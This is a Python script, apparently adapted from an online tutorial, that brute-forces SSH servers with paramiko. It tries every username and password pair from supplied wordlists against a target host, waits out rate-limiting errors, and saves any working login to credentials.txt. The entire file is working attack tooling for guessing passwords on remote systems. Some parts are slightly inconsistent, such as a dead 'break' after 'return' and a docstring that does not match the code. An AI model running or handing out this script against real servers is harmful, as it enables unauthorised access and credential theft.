# Ref: https://www.thepythoncode.com/code/brute-force-ssh-servers-using-paramiko-in-python

import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def is_ssh_open(hostname, username, password, port):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3, port=port)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password, port)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


"""
Attempts to ssh to a given host and port, writes successful credentials to credentials.txt
"""


def brute_force(host, port):
    # read the file
    passlist = open('passwords.txt').read().splitlines()
    userlist = open('usernames.txt').read().splitlines()
    # brute-force
    for username in userlist:
        for password in passlist:
            if is_ssh_open(host, username, password, port):
                # if combo is valid, save it to a file
                return f"Successfully logged in with {username}@{host}:{password}"
                break

    return "Failed to log in."


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-U", "--userlist", help="File that contain username list in each line.")
    parser.add_argument("-p", "--port", help="Port number.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    userlist = args.userlist
    port = args.port
    # read the file
    passlist = open(passlist).read().splitlines()
    userlist = open(userlist).read().splitlines()
    # brute-force
    for username in userlist:
        for password in passlist:
            if is_ssh_open(host, username, password, port):
                # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{username}@{host}:{password}")
                break
